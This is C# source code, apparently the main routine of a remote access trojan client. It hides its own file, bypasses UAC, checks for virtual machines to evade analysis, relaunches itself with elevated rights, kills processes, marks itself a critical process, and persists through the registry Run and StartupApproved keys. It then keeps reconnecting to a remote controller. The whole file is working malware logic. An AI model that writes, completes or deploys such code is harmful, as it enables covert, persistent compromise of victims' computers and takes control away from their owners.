using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using Client.Things;
using Client.Connection;
using Client.Configuration;
using System.Windows.Forms;

namespace Client
{
    internal class Program
    {
        static void Main()
        {
            if (Config.HideFile)
            {
                try
                {
                    HideClient.Execute();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }

            if (Config.UACBy)
            {
                UACBypass.BypassUAC();
            }

            Thread.Sleep(Config.Delay * 1000);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (!MutexControl.CreateMutex())
            {
                Environment.Exit(0);
            }


            if (Config.VM)
            {
                VMCheck.Analyze();
            }

            if (Config.UAC && !checking())
            {
                try
                {
                    ProcessStartInfo proc = new ProcessStartInfo
                    {
                        FileName = Assembly.GetExecutingAssembly().Location,
                        UseShellExecute = true,
                        Verb = "runas"
                    };
                    Process.Start(proc);
                    Environment.Exit(0);
                }
                catch
                {
                    Console.WriteLine("Continue");
                }
            }

            if (Config.HidProc)
            {
                new ProcessKiller();
            }

            if (Config.ProcessCritical)
            {
                processcritical.critical();
            }

            if (Config.OpenWebsite)
            {
                Process.Start(Config.Website);
            }

            Task.Run(() =>
            {
                if (Config.Box)
                {
                    msgbox.Show(Config.BoxMsg, Config.BoxIcon, Config.BoxTit);
                }
            });

            if (Config.Startup)
            {
                AddToStartup();
            }

            if (Config.Assist)
            {
                Task.Run(() => SillyClient.Connect());
                Application.Run(new Form1());
            }
            else
            {
                Task.Run(() => SillyClient.Connect());
                Application.Run(new ApplicationContext());
            }
            while(true)
            {
                try
                {
                    if(!SillyClient.isConnected())
                    {
                        SillyClient.Reconnect();
                        SillyClient.Connect();
                    }
                } catch { }
                Thread.Sleep(5000);
            }
        }

        static bool checking()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static void AddToStartup()
        {
            string appName = Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location);
            string appPath = "\"" + Assembly.GetExecutingAssembly().Location + "\"";

            var registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", true);
            registryKey.SetValue(appName, new byte[] { 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 });
            registryKey.Close();

            registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            registryKey.SetValue(appName, appPath);
            registryKey.Close();
        }
    }
}